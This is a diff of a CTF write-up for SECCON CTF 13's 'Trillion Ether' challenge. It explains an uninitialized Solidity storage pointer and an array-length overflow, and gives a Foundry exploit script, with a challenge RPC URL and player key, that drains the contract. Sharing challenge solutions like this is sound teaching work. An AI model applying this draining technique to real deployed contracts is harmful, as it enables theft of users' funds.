@@ -7,13 +7,17 @@ categories:
 author: Songhyun Bae
 ---
 
-I recently participated in the SECCON CTF 13 Qualifiers with my team, CyKor. I solved the “Trillion Ether” challenge in the blockchain category.
+Hi! I recently participated in the [SECCON CTF 13 Qualifiers](https://ctftime.org/event/2478/) with [CyKor](https://x.com/cykorku) and solved the “Trillion Ether” challenge in the Blockchain category.
 
+In this post, I’d like to share my solution to this challenge. You can find the problem on [Alpacahack](https://alpacahack.com/ctfs/seccon-13-quals/challenges/trillion-ether).
 
-## **Trillion Ether**
+---
+
+## Trillion Ether
+
 > Get Chance!
 
-Below is the code for the challenge. The contract allows the creation of wallets and includes `withdraw` and `transfer` functionalities. To solve the challenge, it is necessary to drain all the funds from the contract.
+Below is the complete code for this challenge. As indicated by the `isSolved` function, the goal is to drain all of the contract’s assets:
 
 ```solidity
 // SPDX-License-Identifier: UNLICENSED
@@ -60,8 +64,9 @@ contract TrillionEther {
     }
 }
 ```
+<br>
 
-The most apparent bug exists in the _newWallet function, where an uninitialized storage variables bug occurs. The wallet variable is declared as storage but is not properly initialized before assignment. Consequently, the data is written starting from storage slot 0.
+At first glance, there’s a clear vulnerability in the `_newWallet` function due to its use of an uninitialized storage variable.
 
 ```solidity
 function _newWallet(bytes32 name, uint256 balance, address owner) internal returns (Wallet storage wallet) {
@@ -72,7 +77,15 @@ function _newWallet(bytes32 name, uint256 balance, address owner) internal retur
 }
 ```
 
-In the TrillionEther contract, storage slot 0 holds the wallets array. Being a dynamic array, this slot stores the array’s length, and the actual elements are stored starting from keccak(0).
+declares `wallet` as a storage variable but never properly initializes it, causing the assignment to write directly to storage `slot 0`.
+
+<br>
+
+I initially thought this vulnerability alone would be enough to solve the problem, but it turned out to be more complicated.
+
+<br>
+
+Inside the TrillionEther contract, `slot 0` is used to store the length of the dynamic wallets array, while the actual wallet data begins at `keccak256(0)` (because the wallets array is declared in `slot 0`):
 
 ```
 $ forge inspect TrillionEther storage-layout --pretty
@@ -81,7 +94,12 @@ $ forge inspect TrillionEther storage-layout --pretty
 | wallets | struct TrillionEther.Wallet[] | 0    | 0      | 32    | src/TrillionEther.sol:TrillionEther |
 ```
 
-The wallets array consists of the Wallet struct, which occupies three storage slots for each element:
+Therefore, simply overwriting `slot 0` lets you modify the length of the `wallets` array. The challenge is to combine this with a method to drain the contract’s entire balance.
+
+<br>
+
+First, each element of the wallets array is a Wallet struct occupying three storage slots:
+
 ```solidity
 struct Wallet {
     bytes32 name;
@@ -92,14 +110,48 @@ struct Wallet {
 Wallet[] public wallets;
 ```
 
-As a result, the storage slot for a new element in the array can be calculated using the formula: `keccak(0) + arrayLength * 3`
+When `wallets.push(...)` executed, the storage index for the new struct is calculated roughly by:
+
+```solidity
+keccak256(0) + arrayLength * 3
+```
+
+<br>
+
+Hmm… What happens if `arrayLength` becomes large enough that multiplying it by 3 causes an overflow? In that case, `arrayLength * 3` would wrap around to a much smaller value than expected, potentially allowing us to write data to an unintended storage location—like setting the balance to an address or owner address..
+
+Since values in the contract are calculated using `uint256`, if `arrayLength * 3` exceeds `type(uint256).max`, an overflow is likely to occur.
+
+<br>
+
+This hypothesis turned out to be correct. I was able to overwrite the `balance` value of a specific Wallet struct in the wallets array with either the `owner` or `name` variable.
+
+<br>
+
+Now, the next step was to calculate the exact point. First, I determined the value that would trigger an overflow. Since `type(uint256).max` is perfectly divisible by 3, passing this value as an argument to the `createWallet` function should successfully cause the overflow.
+
+```solidity
+uint256 maxUint = type(uint256).max;
+uint256 n = maxUint / 3;
+console.log(n);
+// 38597363079105398474523661669562635951089994888546854679819194669304376546645
+```
+
+<br>
+
+When visualized, it looks like this:
+<img width="1300" alt="image" src="https://github.com/user-attachments/assets/2a921479-9bfe-4d16-b739-fcd8ae639980" />
 
 
-By manipulating the array length in slot 0, we can cause an integer overflow during the multiplication step. This overflow allows us to overwrite the balance field of the Wallet struct with the owner address. By strategically creating wallets and controlling the overflow, we can target specific storage slots, overwrite critical data, and eventually drain all funds.
+<br>
+
+So, I was able to successfully overwrite the balance value with the owner address. To exploit this, I first created a `wallet` at index 1, where I was the owner, and then created another `wallet` at position `(maxUint / 3) + 1`, which allowed me to execute the attack.
+
+<br>
 
 ### Solution Script
 
-Below is the exploit script that drains the contract:
+This is my solution script based on the above approach.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -117,7 +169,7 @@ contract solve is Script {
     TrillionEther problemInstance;
 
     function setUp() external {
-        string memory rpcUrl = "http://trillion-ether.seccon.games:8545/fcf85a4f-6b2f-4f81-aef5-e966d043277f";
+        string memory rpcUrl = "<http://trillion-ether.seccon.games:8545/fcf85a4f-6b2f-4f81-aef5-e966d043277f>";
         playerPrivateKey = 0x6d9be7bb251e23e43ac737e9ce272c97d11eb2d8164b70fd92242a076eab0d30;
         address problemContract = 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F;
 
@@ -130,34 +182,12 @@ contract solve is Script {
     function run() external {
         vm.startBroadcast(playerPrivateKey);
 
-        problemInstance.createWallet{value: 0}(bytes32(uint256(1))); 
+        problemInstance.createWallet{value: 0}(bytes32(uint256(1)));
         problemInstance.createWallet{value: 0}(bytes32(uint256(38597363079105398474523661669562635951089994888546854679819194669304376546646)));
-        
+
         problemInstance.withdraw(1, address(problemInstance).balance);
 
         vm.stopBroadcast();
     }
 }
 ```
-
-```
-$ forge script solve -vvvv --broadcast
-[⠊] Compiling...
-No files changed, compilation skipped
-Traces:
-  [156386] solve::run()
-    ├─ [0] VM::startBroadcast(<pk>)
-    │   └─ ← [Return] 
-    ├─ [93340] 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F::createWallet(0x0000000000000000000000000000000000000000000000000000000000000001)
-    │   └─ ← [Stop] 
-    ├─ [43240] 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F::createWallet(0x5555555555555555555555555555555555555555555555555555555555555556)
-    │   └─ ← [Stop] 
-    ├─ [8328] 0x775e072738D978416d8bc7805B8Cf4f34C0Bf80F::withdraw(1, 1000000000000000000000000000000 [1e30])
-    │   ├─ [0] 0x6B4df773CB9AdA0515BBC8F4eB9e57C18cE54152::fallback{value: 1000000000000000000000000000000}()
-    │   │   └─ ← [Stop] 
-    │   └─ ← [Stop] 
-    ├─ [0] VM::stopBroadcast()
-    │   └─ ← [Return] 
-    └─ ← [Stop] 
-```
-
